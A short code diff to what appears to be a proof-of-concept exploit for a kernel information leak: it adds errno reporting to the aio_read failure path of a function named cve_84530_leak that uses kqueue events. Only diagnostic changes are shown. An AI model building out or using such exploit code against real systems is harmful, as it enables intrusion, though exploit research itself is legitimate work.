@@ -8,6 +8,7 @@
 #include <sys/event.h>
 #include <sys/types.h>
 #include <signal.h>
+#include <errno.h>
 #include <pthread.h>
 
 #define SIGEV_KEVENT             3
@@ -97,7 +98,7 @@ uint64_t cve_84530_leak(void) {
     int ret = fn_aio_read(&cb);
     if (ret != 0) {
         snprintf(g_result, sizeof(g_result),
-            "aio_read() failed: %d (sandbox blocks AIO?)", ret);
+            "aio_read() failed ret=%d errno=%d (%s)", ret, errno, strerror(errno));
         close(kq); close(fd); return 0;
     }
     usleep(20000);
